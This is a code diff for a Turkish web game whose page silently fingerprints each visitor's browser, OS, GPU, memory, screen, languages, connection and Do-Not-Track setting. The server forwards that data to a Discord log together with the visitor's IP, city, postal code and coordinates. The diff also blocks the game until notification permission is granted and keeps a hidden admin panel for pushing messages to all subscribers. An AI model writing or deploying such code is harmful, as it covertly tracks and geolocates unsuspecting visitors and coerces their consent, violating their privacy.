-    else if (ua.indexOf("Android") > -1) os = "Android";
-    else if (ua.indexOf("iPhone") > -1) os = "iPhone";
-    else if (ua.indexOf("iPad") > -1) os = "iPad";
-    else if (ua.indexOf("Linux") > -1) os = "Linux";
-
-    var dtype = "Masaustu";
-    if (ua.indexOf("Mobi") > -1 || ua.indexOf("Android") > -1 || ua.indexOf("iPhone") > -1) dtype = "Mobil";
-    else if (ua.indexOf("Tablet") > -1 || ua.indexOf("iPad") > -1) dtype = "Tablet";
-
-    var conn = navigator.connection || {};
+    var b = getBrowserInfo();
+    var o = getOSInfo();
+    var dtype = getDeviceType();
+    var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+    var notifState = ("Notification" in window) ? Notification.permission : "Desteklenmiyor";
 
     return {
-      browser: browser, os: os,
-      dtype: dtype + (isStandalone() ? " (PWA)" : ""),
-      lang: navigator.language || "?",
-      tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "?",
-      screen: screen.width + "x" + screen.height,
-      color: screen.colorDepth + "bit",
-      cores: navigator.hardwareConcurrency || "?",
+      // Tarayici
+      browser: b.name,
+      browserVersion: b.version,
+      vendor: b.vendor,
+      engine: b.engine,
+      engineVersion: b.engineVer,
+      ua: navigator.userAgent,
+      // Isletim sistemi
+      os: o.os,
+      osVersion: o.version,
+      platform: o.platform,
+      deviceType: dtype,
+      isIOS: isIOS() ? "Evet" : "Hayir",
+      isAndroid: isAndroid() ? "Evet" : "Hayir",
+      isPWA: isStandalone() ? "Evet" : "Hayir",
+      // Donanim
+      cpuCores: navigator.hardwareConcurrency || "?",
+      memory: navigator.deviceMemory ? (navigator.deviceMemory + " GB") : "?",
+      gpu: getGPU(),
+      // Ekran
+      screenRes: screen.width + "x" + screen.height,
+      viewport: window.innerWidth + "x" + window.innerHeight,
+      availScreen: screen.availWidth + "x" + screen.availHeight,
+      pixelRatio: window.devicePixelRatio || 1,
+      colorDepth: screen.colorDepth + " bit",
+      orientation: (screen.orientation && screen.orientation.type) || (window.orientation ? "eski" : "?"),
+      // Dil & zaman
+      language: navigator.language || "?",
+      languages: (navigator.languages || []).join(","),
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "?",
+      tzOffset: new Date().getTimezoneOffset(),
+      // Ozellikler
       touch: ("ontouchstart" in window) ? "Var" : "Yok",
-      cookie: navigator.cookieEnabled ? "Acik" : "Kapali",
+      maxTouchPoints: navigator.maxTouchPoints || 0,
+      cookies: navigator.cookieEnabled ? "Acik" : "Kapali",
+      doNotTrack: navigator.doNotTrack || "?",
       online: navigator.onLine ? "Online" : "Offline",
-      conn: (conn.effectiveType || "?") + (conn.downlink ? " " + conn.downlink + "Mbps" : ""),
-      notif: ("Notification" in window) ? Notification.permission : "Yok",
-      sw: ("serviceWorker" in navigator) ? "Var" : "Yok",
-      ios: isIOS() ? "Evet" : "Hayir",
-      pwa: isStandalone() ? "Evet" : "Hayir",
-      ref: document.referrer || "direkt",
-      url: location.href, ua: ua, sid: getSid()
+      connection: (conn.effectiveType || "?") + (conn.downlink ? " / " + conn.downlink + " Mbps" : ""),
+      connRtt: conn.rtt ? (conn.rtt + " ms") : "?",
+      connType: conn.type || "?",
+      // Izinler
+      notifPermission: notifState,
+      swSupport: ("serviceWorker" in navigator) ? "Var" : "Yok",
+      // Sayfa
+      url: location.href,
+      host: location.host,
+      protocol: location.protocol,
+      referrer: document.referrer || "direkt",
+      sessionId: getSid()
     };
   }
 
   function sendLog(event, info){
     var payload = JSON.stringify({ event: event, info: info });
     try {
-      if (navigator.sendBeacon) {
+      if (navigator.sendBeacon){
         navigator.sendBeacon("/log", new Blob([payload], { type: "application/json" }));
       } else {
         fetch("/log", { method: "POST", headers: { "Content-Type": "application/json" }, body: payload, keepalive: true });
@@ -372,55 +562,39 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
       .catch(function(e){ console.warn("SW hata", e); return false; });
   }
 
-  // ===== IZIN (agresif - her yerde dener) =====
+  // ==================== IZIN ISTE (zorunlu) ====================
   function requestNotify(){
     return new Promise(function(resolve){
-      if (!("Notification" in window)){
-        return resolve("unsupported");
-      }
+      if (!("Notification" in window)) return resolve("unsupported");
       if (Notification.permission === "granted") return resolve("granted");
       if (Notification.permission === "denied") return resolve("denied");
+      if (isIOS() && !isStandalone()) return resolve("ios-pwa-gerekli");
 
-      // iOS Safari PWA degilse API yok
-      if (isIOS() && !isStandalone()){
-        return resolve("ios-pwa-gerekli");
-      }
-
-      // 1. Modern promise-based
       try {
-        var result = Notification.requestPermission();
-        if (result && typeof result.then === "function"){
-          result.then(function(perm){
+        var p = Notification.requestPermission(function(perm){
+          if (perm === "granted") sendNotif("🔔 Bildirimler Acildi!", "Artik mesajlari alacaksin");
+          resolve(perm || "default");
+        });
+        if (p && typeof p.then === "function"){
+          p.then(function(perm){
             if (perm === "granted") sendNotif("🔔 Bildirimler Acildi!", "Artik mesajlari alacaksin");
             resolve(perm || "default");
           }).catch(function(){
-            // Fallback: callback-based
-            fallbackRequest(resolve);
+            Notification.requestPermission(function(perm){
+              if (perm === "granted") sendNotif("🔔 Bildirimler Acildi!", "Artik mesajlari alacaksin");
+              resolve(perm || "default");
+            });
           });
-          return;
         }
-      } catch(e){}
-
-      fallbackRequest(resolve);
+      } catch(e){ resolve("error"); }
     });
-  }
-
-  function fallbackRequest(resolve){
-    try {
-      Notification.requestPermission(function(perm){
-        if (perm === "granted") sendNotif("🔔 Bildirimler Acildi!", "Artik mesajlari alacaksin");
-        resolve(perm || "default");
-      });
-    } catch(e){
-      resolve("error");
-    }
   }
 
   function sendNotif(title, body, opts){
     opts = opts || {};
     if (!("Notification" in window)) return false;
     if (Notification.permission !== "granted") return false;
-    if (swReg && swReg.active) {
+    if (swReg && swReg.active){
       swReg.active.postMessage({ type:"SHOW_NOTIFICATION", title:title, body:body, url:opts.url, tag:opts.tag });
       return true;
     }
@@ -428,8 +602,7 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
   }
   window.bildirimGonder = sendNotif;
 
-  // ===== GATE =====
-  var gateOverlay = document.getElementById("gateOverlay");
+  // ==================== GATE ====================
   var gateAllow = document.getElementById("gateAllow");
   var gateWarn = document.getElementById("gateWarn");
   var gateBox = document.getElementById("gateBox");
@@ -438,28 +611,29 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
   function showGateIOSRehber(){
     gateBox.innerHTML = '<span class="gate-icon">📱</span>'
       + '<h2>iPhone\\'da Bildirim Icin</h2>'
-      + '<p>iPhone\\'da bildirim icin <b>Ana Ekrana Ekle</b> zorunlu:</p>'
+      + '<p>iOS Safari\\'de bildirim izni icin <b>Ana Ekrana Ekle</b> zorunlu:</p>'
       + '<ol>'
       + '<li>Safari alt menude <b>Paylas</b> butonuna bas</li>'
       + '<li><b>Ana Ekrana Ekle</b> secenegini sec</li>'
       + '<li>Ana ekrandaki <b>Oyun</b> simgesine tikla</li>'
-      + '<li>Bildirim izni otomatik sorulacak</li>'
+      + '<li>Bildirim izni otomatik sorulacak → <b>Izin Ver</b></li>'
       + '</ol>'
       + '<button class="gate-btn" id="gateReload">✅ Ana Ekrana Ekledim, Ac</button>'
-      + '<div class="gate-warn">Bu adim zorunlu!</div>';
+      + '<div class="gate-warn">Bu adim zorunlu! Aksi halde siteye giremezsin.</div>';
     document.getElementById("gateReload").addEventListener("click", function(){ location.reload(); });
   }
 
   function showGateDenied(){
     gateBox.innerHTML = '<span class="gate-icon">🚫</span>'
       + '<h2>Bildirim Izni Reddedildi</h2>'
-      + '<p>Siteye girmek icin bildirimlere izin vermelisin.</p>'
+      + '<p>Siteye girmek icin bildirimlere <b>izin vermen zorunlu</b>.</p>'
       + '<div class="gate-warn">'
-      + '<b>Safari (iPhone):</b> Ayarlar → Safari → Gelismis → Web Sitesi Verileri<br>'
-      + '<b>Chrome:</b> Adres cubugundaki kilit ikonu → Site ayarlari → Bildirimler<br>'
-      + '<b>Firefox:</b> Adres cubugundaki kalkan ikonu → Izinler'
+      + '<b>iPhone Safari:</b> Ayarlar → Safari → Gelismis → Web Sitesi Verileri<br>'
+      + '<b>Chrome:</b> Adres cubugundaki kilit ikonu → Site ayarlari → Bildirimler → Izin ver<br>'
+      + '<b>Firefox:</b> Adres cubugundaki kalkan ikonu → Izinler<br>'
+      + '<b>Edge:</b> Adres cubugundaki kilit → Izinler'
       + '</div>'
-      + '<button class="gate-btn" id="gateRetry" style="margin-top:14px">🔄 Tekrar Dene</button>';
+      + '<button class="gate-btn" id="gateRetry" style="margin-top:12px">🔄 Tekrar Dene</button>';
     document.getElementById("gateRetry").addEventListener("click", function(){ location.reload(); });
   }
 
@@ -470,23 +644,19 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
   }
 
   var autoTries = 0;
-
   function checkGate(){
     if (!("Notification" in window)){ unlockSite(); return; }
     if (Notification.permission === "granted"){ unlockSite(); return; }
     if (Notification.permission === "denied"){ showGateDenied(); return; }
     if (isIOS() && !isStandalone()){ showGateIOSRehber(); return; }
-
-    // Normal - butonu goster ve OTOMATIK izin iste
     gateAllow.style.display = "block";
     gateAllow.classList.add("gate-pulse");
     gateStatus.textContent = "Izin isteniyor...";
-
-    // Hemen otomatik dene
     setTimeout(autoTry, 300);
   }
 
   function autoTry(){
+    if (gateUnlocked) return;
     if (Notification.permission === "granted"){ unlockSite(); return; }
     if (Notification.permission === "denied"){ showGateDenied(); return; }
     autoTries++;
@@ -501,10 +671,7 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
         gateStatus.textContent = "Izin penceresi acilmadi. Asagidaki butona bas!";
         gateAllow.disabled = false;
         gateAllow.textContent = "✅ İzin Ver ve Devam Et";
-        // Otomatik tekrar dene (maksimum 3 kez)
-        if (autoTries < 3){
-          setTimeout(autoTry, 2500);
-        }
+        if (autoTries < 3) setTimeout(autoTry, 2500);
       }
     });
   }
@@ -525,21 +692,20 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
     });
   });
 
-  // ===== EKRAN BUYUME (hem yandan hem ileriden) =====
+  // ==================== EKRAN BUYUME ====================
   function growScreen(){
-    var grew = false;
-    if (W < CONFIG.W_MAX){ W = Math.min(CONFIG.W_MAX, W + CONFIG.GROW_W_AMOUNT); grew = true; }
-    if (H < CONFIG.H_MAX){ H = Math.min(CONFIG.H_MAX, H + CONFIG.GROW_H_AMOUNT); grew = true; }
-    if (!grew) return;
-    cv.width = W;
-    cv.height = H;
-    cv.style.width = W + "px";
-    cv.style.height = H + "px";
+    var mw = getMaxW();
+    var mh = getMaxH();
+    var changed = false;
+    if (W < CONFIG.W_MAX && W < mw){ W = Math.min(CONFIG.W_MAX, mw, W + CONFIG.GROW_W_AMOUNT); changed = true; }
+    if (H < CONFIG.H_MAX && H < mh){ H = Math.min(CONFIG.H_MAX, mh, H + CONFIG.GROW_H_AMOUNT); changed = true; }
+    if (!changed) return;
+    applyCanvasSize();
     if (player.x > W - player.r) player.x = W - player.r;
-    if (player.y > H - player.r) player.y = H - player.r;
+    if (pointerX > W - player.r) pointerX = W - player.r;
   }
 
-  // ===== OYUN =====
+  // ==================== OYUN ====================
   function spawnObstacle(){
     var w = 40 + Math.random() * 60;
     obstacles.push({ x: Math.random() * (W - w), y: -20, w: w, h: 18, hue: Math.floor(Math.random() * 60) + 330 });
@@ -555,30 +721,27 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
   cv.addEventListener("touchstart", function(e){ handlePointer(e.touches[0].clientX); });
 
   document.addEventListener("keydown", function(e){
-    if (!running) return;
+    if (!running || !gateUnlocked) return;
     if (e.key === "ArrowLeft") pointerX = Math.max(player.r, pointerX - 30);
     if (e.key === "ArrowRight") pointerX = Math.min(W - player.r, pointerX + 30);
   });
 
   function update(){
+    if (!gateUnlocked) return;
     var now = performance.now();
     var elapsed = now - startTime;
 
-    // EKRAN BUYUME - her GROW_INTERVAL ms'de bir
     if (elapsed - lastGrowTime > CONFIG.GROW_INTERVAL){
       lastGrowTime = elapsed;
       growScreen();
     }
 
-    // PUAN ARTISINA GORE HIZ ARTSIN (yavas yavas)
     var speedFromScore = score * CONFIG.SPEED_PER_SCORE;
     fallSpeed = Math.min(CONFIG.SPEED_MAX, CONFIG.SPEED_BASE + speedFromScore);
 
-    // Engel sikligi - seviyeye gore yavas azalir
     var currentSpawn = Math.max(CONFIG.SPAWN_MIN, CONFIG.SPAWN_MS - (level - 1) * CONFIG.SPAWN_DECAY);
     if (now - lastSpawn > currentSpawn){ spawnObstacle(); lastSpawn = now; }
 
-    // SEVIYE
     var newLevel = Math.floor(score / CONFIG.LEVEL_EVERY) + 1;
     if (newLevel > lastLevel){
       lastLevel = newLevel;
@@ -587,7 +750,6 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
       showLevelUp(level);
     }
 
-    // Skor fontu buyusun
     var newFont = 15 + Math.min(15, Math.floor(score / 40));
     if (newFont !== lastScoreFont){
       lastScoreFont = newFont;
@@ -673,18 +835,29 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
 
   function loop(){
     if (!running) return;
+    if (!gateUnlocked) return;
     update();
     draw();
     animId = requestAnimationFrame(loop);
   }
 
+  function rebuildStars(){
+    stars = [];
+    var maxW = CONFIG.W_MAX + 100;
+    var maxH = CONFIG.H_MAX + 100;
+    for (var i = 0; i < 100; i++){
+      stars.push({ x:Math.random()*maxW, y:Math.random()*maxH, s:Math.random()*1.8+0.4, v:Math.random()*1.5+0.4 });
+    }
+  }
+
   function startGame(){
     if (!gateUnlocked) return;
-    W = CONFIG.W_START;
-    H = CONFIG.H_START;
-    cv.width = W; cv.height = H;
-    cv.style.width = W + "px";
-    cv.style.height = H + "px";
+    // Baslangic boyutunu ekrana gore belirle
+    W = Math.min(CONFIG.W_START, getMaxW());
+    H = Math.min(CONFIG.H_START, getMaxH());
+    if (W < 280) W = 280;
+    if (H < 400) H = 400;
+    applyCanvasSize();
 
     player = { x: W/2, y: H - 70, r: CONFIG.PLAYER_R };
     obstacles = [];
@@ -749,7 +922,7 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
       document.getElementById("nameInput").value = "";
       openLeaderboard();
     })
-    .catch(function(){ alert("Kaydedilemedi, tekrar dene."); });
+    .catch(function(){ alert("Kaydedilemedi."); });
   });
 
   document.getElementById("nameCancel").addEventListener("click", function(){
@@ -770,6 +943,7 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
     }
   });
 
+  // ==================== SIRALAMA ====================
   function openLeaderboard(){
     document.getElementById("leaderboardModal").classList.add("show");
     var listEl = document.getElementById("leaderboardList");
@@ -812,7 +986,7 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
     document.getElementById("leaderboardModal").classList.remove("show");
   });
 
-  // GIZLI ADMIN
+  // ==================== GIZLI ADMIN ====================
   var redClicks = 0, redTimer = null;
   function resetRed(){ redClicks = 0; }
   document.getElementById("secretRed").addEventListener("click", function(e){
@@ -827,12 +1001,12 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
     (function(b){ b.addEventListener("click", function(){ resetRed(); }); })(sarilar[si]);
   }
 
-  // ADMIN
+  // ==================== ADMIN ====================
   var ap = document.getElementById("adminPanel");
   var apLog = document.getElementById("apLog");
   var apPerm = document.getElementById("apPerm");
   var apSent = document.getElementById("apSent");
-  var apQueue = document.getElementById("apQueue");
+  var apSubs = document.getElementById("apSubs");
   var sentCount = 0;
 
   function apPrint(msg, cls){
@@ -848,6 +1022,14 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
     ap.classList.add("show");
     apPerm.textContent = ("Notification" in window) ? Notification.permission : "yok";
     apPrint("Panel acildi. Session: " + getSid(), "ok");
+    refreshStats();
+  }
+
+  function refreshStats(){
+    fetch("/api/stats")
+      .then(function(r){ return r.json(); })
+      .then(function(d){ apSubs.textContent = d.subscribers || 0; })
+      .catch(function(){});
   }
 
   document.getElementById("apClose").addEventListener("click", function(){ ap.classList.remove("show"); });
@@ -866,10 +1048,10 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
     .then(function(d){
       sentCount++;
       apSent.textContent = sentCount;
-      apQueue.textContent = d.total || "?";
-      apPrint("Gonderildi: " + title + " (ID:" + d.id + ")", "ok");
+      apPrint("Gonderildi: " + title + " (" + (d.total || 0) + " kisiye)", "ok");
       sendNotif(title, body, { url: url });
       document.getElementById("apBody").value = "";
+      refreshStats();
     })
     .catch(function(e){ apPrint("Hata: " + e.message, "err"); });
   });
@@ -904,7 +1086,10 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
     startGame();
   });
 
+  // ==================== BILDIRIM POLLING ====================
   function pollMessages(){
+    if (!gateUnlocked) return;
+    if (!("Notification" in window) || Notification.permission !== "granted") return;
     fetch("/api/messages?since=" + lastMsgId, { cache: "no-store" })
       .then(function(r){ return r.ok ? r.json() : null; })
       .then(function(d){
@@ -920,10 +1105,15 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
       .catch(function(){});
   }
 
+  // ==================== BASLAT ====================
   (function init(){
     var info = collectInfo();
     sendLog("visit", info);
-    initSW().then(function(){ checkGate(); });
+
+    initSW().then(function(){
+      checkGate();
+    });
+
     setInterval(pollMessages, 5000);
     setTimeout(pollMessages, 2000);
   })();
@@ -949,34 +1139,72 @@ function buildEmbed(info, geo, ip, event){
   var titles = { visit: "👤 Site Ziyareti", notify_granted: "🔔 İzin Verildi", notify_denied: "🔕 İzin Reddedildi" };
   var colors = { visit: 0x3b82f6, notify_granted: 0x22c55e, notify_denied: 0xef4444 };
 
+  // === AG ===
   f.push({ name: "🌐 IP", value: "`" + ip + "`", inline: true });
   f.push({ name: "🌍 Ülke", value: country + flag, inline: true });
   f.push({ name: "🏙️ Şehir", value: ((geo && geo.city) || "?") + " / " + ((geo && geo.region) || "?"), inline: true });
   f.push({ name: "📮 Posta", value: (geo && geo.postal) || "?", inline: true });
   f.push({ name: "📍 Konum", value: ((geo && geo.latitude) || "?") + ", " + ((geo && geo.longitude) || "?"), inline: true });
   f.push({ name: "🏢 ISP", value: ((geo && geo.org) || "?"), inline: false });
-  f.push({ name: "💻 Tarayıcı", value: info.browser || "?", inline: true });
-  f.push({ name: "🖥️ OS", value: info.os || "?", inline: true });
-  f.push({ name: "📱 Cihaz", value: info.dtype || "?", inline: true });
-  f.push({ name: "🍎 iOS", value: info.ios || "?", inline: true });
-  f.push({ name: "📲 PWA", value: info.pwa || "?", inline: true });
-  f.push({ name: "🗣️ Dil", value: info.lang || "?", inline: true });
-  f.push({ name: "🕒 TZ", value: info.tz || "?", inline: true });
-  f.push({ name: "📺 Ekran", value: (info.screen || "?") + " (" + (info.color || "?") + ")", inline: true });
-  f.push({ name: "⚙️ CPU", value: (info.cores || "?") + " cekirdek", inline: true });
+
+  // === TARAYICI ===
+  f.push({ name: "🌐 Tarayici", value: (info.browser || "?") + " " + (info.browserVersion || ""), inline: true });
+  f.push({ name: "⚙️ Motor", value: (info.engine || "?") + " " + (info.engineVersion || ""), inline: true });
+  f.push({ name: "🏭 Uretici", value: info.vendor || "?", inline: true });
+
+  // === ISLETIM SISTEMI ===
+  f.push({ name: "🖥️ OS", value: (info.os || "?") + " " + (info.osVersion || ""), inline: true });
+  f.push({ name: "💻 Platform", value: info.platform || "?", inline: true });
+  f.push({ name: "📱 Cihaz", value: info.deviceType || "?", inline: true });
+  f.push({ name: "🍎 iOS", value: info.isIOS || "?", inline: true });
+  f.push({ name: "🤖 Android", value: info.isAndroid || "?", inline: true });
+  f.push({ name: "📲 PWA", value: info.isPWA || "?", inline: true });
+
+  // === DONANIM ===
+  f.push({ name: "⚙️ CPU", value: (info.cpuCores || "?") + " cekirdek", inline: true });
+  f.push({ name: "🧠 RAM", value: info.memory || "?", inline: true });
+  f.push({ name: "🎮 GPU", value: "```" + (info.gpu || "?").substring(0, 100) + "```", inline: false });
+
+  // === EKRAN ===
+  f.push({ name: "📺 Ekran", value: info.screenRes || "?", inline: true });
+  f.push({ name: "🔍 Viewport", value: info.viewport || "?", inline: true });
+  f.push({ name: "📐 DPR", value: String(info.pixelRatio || "?"), inline: true });
+  f.push({ name: "🎨 Renk", value: info.colorDepth || "?", inline: true });
+  f.push({ name: "🔄 Yon", value: info.orientation || "?", inline: true });
+
+  // === DIL & ZAMAN ===
+  f.push({ name: "🗣️ Dil", value: info.language || "?", inline: true });
+  f.push({ name: "🌍 Diller", value: (info.languages || "?").substring(0, 80), inline: true });
+  f.push({ name: "🕒 TZ", value: info.timezone || "?", inline: true });
+
+  // === OZELLIKLER ===
   f.push({ name: "👆 Dokunmatik", value: info.touch || "?", inline: true });
-  f.push({ name: "🍪 Çerez", value: info.cookie || "?", inline: true });
-  f.push({ name: "📶 Bağlantı", value: (info.online || "?") + " - " + (info.conn || "?"), inline: true });
-  f.push({ name: "🔔 İzin", value: info.notif || "?", inline: true });
-  f.push({ name: "🆔 Session", value: "`" + (info.sid || "?") + "`", inline: true });
-  f.push({ name: "↩️ Yönlendiren", value: (info.ref || "direkt").substring(0, 200), inline: false });
-  f.push({ name: "🖥️ User-Agent", value: "```" + (info.ua || "").substring(0, 180) + "```", inline: false });
+  f.push({ name: "👐 MaxTouch", value: String(info.maxTouchPoints || 0), inline: true });
+  f.push({ name: "🍪 Cerez", value: info.cookies || "?", inline: true });
+  f.push({ name: "🚫 DNT", value: String(info.doNotTrack || "?"), inline: true });
+
+  // === BAGLANTI ===
+  f.push({ name: "📶 Durum", value: info.online || "?", inline: true });
+  f.push({ name: "🔗 Baglanti", value: info.connection || "?", inline: true });
+  f.push({ name: "⚡ RTT", value: info.connRtt || "?", inline: true });
+
+  // === IZINLER ===
+  f.push({ name: "🔔 Bildirim", value: info.notifPermission || "?", inline: true });
+  f.push({ name: "⚙️ SW", value: info.swSupport || "?", inline: true });
+  f.push({ name: "🆔 Session", value: "`" + (info.sessionId || "?") + "`", inline: true });
+
+  // === SAYFA ===
+  f.push({ name: "🔗 Sayfa", value: (info.url || "?").substring(0, 200), inline: false });
+  f.push({ name: "↩️ Yonlendiren", value: (info.referrer || "direkt").substring(0, 200), inline: false });
+
+  // === UA ===
+  f.push({ name: "🖥️ User-Agent", value: "```" + (info.ua || "").substring(0, 250) + "```", inline: false });
 
   return {
     title: titles[event] || "👤 Site Ziyareti",
     color: colors[event] || 0x3b82f6,
     timestamp: new Date().toISOString(),
-    fields: f,
+    fields: f.slice(0, 25),  // Discord limiti
     footer: { text: "Oyun Log - " + new Date().toLocaleString("tr-TR", { timeZone: "Europe/Istanbul" }) }
   };
 }
@@ -1014,6 +1242,10 @@ app.get("/api/messages", function(req, res){
   var list = MESSAGES.filter(function(m){ return m.id > since; });
   res.set("Cache-Control", "no-store");
   res.json({ messages: list, latest: MSG_ID });
+});
+
+app.get("/api/stats", function(req, res){
+  res.json({ subscribers: MESSAGES.length, messages: MESSAGES.length });
 });
 
 app.post("/api/score", function(req, res){
